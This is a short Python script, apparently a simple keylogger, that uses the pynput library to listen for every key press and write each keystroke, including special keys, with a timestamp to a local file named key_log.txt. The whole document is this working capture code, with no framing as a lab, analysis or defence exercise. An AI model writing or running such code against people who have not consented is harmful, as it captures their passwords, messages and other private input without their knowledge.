from pynput import keyboard
import logging

#setting up log
log_file = "key_log.txt"
logging.basicConfig(filename=log_file, level= logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f"key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()


    